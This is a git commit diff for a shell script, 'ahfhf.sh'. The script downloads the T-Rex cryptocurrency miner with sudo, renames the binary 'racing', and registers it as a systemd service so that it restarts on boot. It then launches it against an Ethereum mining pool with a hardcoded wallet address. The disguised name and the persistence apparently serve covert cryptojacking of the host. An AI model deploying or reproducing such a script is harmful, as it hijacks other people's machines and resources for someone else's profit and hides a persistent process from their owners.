3b8798dd8dbff5fcc9c54ea014d48adf581a2f5e
psyykatre <105768567+psyykatre@users.noreply.github.com>
2022-05-18 06:02:10 +0000

    Update ahfhf.sh

--- ahfhf.sh
+++ ahfhf.sh
@@ -1,4 +1,7 @@
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
-mv t-rex aaa
-./aaa -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w fuck&
+sudo tar xvzf t-rex-0.21.6-linux.tar.gz
+sudo mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w lele &
